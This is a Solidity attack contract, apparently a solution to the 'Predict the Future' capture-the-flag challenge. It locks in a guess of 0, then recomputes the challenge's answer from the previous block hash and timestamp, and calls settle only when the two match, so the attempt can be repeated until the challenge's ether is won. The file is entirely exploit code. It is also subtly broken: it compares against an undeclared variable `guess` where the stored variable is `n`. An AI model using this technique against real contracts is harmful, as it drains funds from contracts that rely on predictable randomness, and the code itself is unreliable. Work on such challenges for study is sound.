// SPDX-License-Identifier: MIT
pragma solidity ^0.4.21;

import "./PredictTheFutureChallenge.sol";

contract Attack {
    PredictTheFutureChallenge src;

    uint8 n = 0;

    constructor(address _src) {
        src = PredictTheFutureChallenge(_src);
    }

    function lock() public payable {
        src.lockInGuess.value(msg.value)(n);
    }

    // Call settle in different blocks until the answer is correct
    function settle() public {
        uint8 answer = uint8(
            keccak256(block.blockhash(block.number - 1), now)
        ) % 10;

        if (guess == answer) {
            src.settle();
            require(address(this).balance == 2 ether);
        }
    }

    function() payable {}
}
